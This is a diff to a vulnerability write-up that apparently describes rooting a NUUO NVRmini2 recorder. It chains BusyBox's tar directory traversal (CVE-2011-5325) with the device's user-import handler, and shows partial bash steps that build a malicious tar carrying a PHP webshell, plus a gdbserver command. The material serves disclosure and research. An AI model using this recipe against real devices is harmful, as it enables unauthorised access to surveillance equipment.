@@ -96,14 +96,14 @@ OK this is nice... but we still need to get root. Time to look for a privilege e
 The NVRmini2 uses a very old `busybox` version, something that is common amongst IoT devices.
 The latest firmware version 03.11.0000.0016 uses `BusyBox v1.16.1 (2013-11-12 15:35:46 CST) multi-call binary`.
 
-This version is affected by many vulnerabilities, one of them being [CVE-2011-5325](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-5325), a directory traversal when unpacking `tar` archives. For more details please check this [commit message](https://git.busybox.net/busybox/commit/?id=a116552869db5e7793ae10968eb3c962c69b3d8c), but the following section also explains how to create a malicious tar.
+This version is affected by many vulnerabilities, one of them being [CVE-2011-5325](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-5325), a directory traversal when unpacking `tar` archives. For more details please check this [commit message](https://git.busybox.net/busybox/commit/?id=a116552869db5e7793ae10968eb3c962c69b3d8c). The following section also explains how to create a malicious tar.
 
 How can we combine these two vulnerabilities?
 
 ## Exploit Chain
 By now an astute reader will remember that the user import function located at offset `0x2B990` in the `cgi_system` binary has to perform a series of steps, including untar'ing the file provided in the HTTP POST, after it is decrypted.
 
-Let's abuse this mechanism. First we create our malicious `tar` file:
+Let's abuse this mechanism. First we create our malicious `tar` file with our webshell `shelly.php`:
 
 ```bash
 echo haha > owned
@@ -117,13 +117,13 @@ tar --append -f sploit.tar nuuo/shelly.php
 gzip sploit.tar
 ```
 
-However, if you recall from previous sections, we have to encrypt this file (it is first decrypted before it is untar'ed), and I was too lazy to reverse the encryption. 
+However, if you recall from previous sections, we have to encrypt this file (it is first decrypted before it is untar'ed), and I was too lazy to reverse the encryption. The last step (`gzip`) is necessary because the handler expects a zipped file.
 
 This is easily solvable by following the previously described steps to obtain a root shell on the target. We then start `gdbserver` (which is helpfully included in the target) with:
 
 `gdbserver :3333 /NUUO/bin/cgi_system exportuser 'bfile=stuff'`
 
-We then set a breakpoint at offset `0x2AF5C`:
+We connect our remote debugger and set a breakpoint at offset `0x2AF5C`:
 ```c
 fd_w = fopen(cfg_file, "r");
 ```
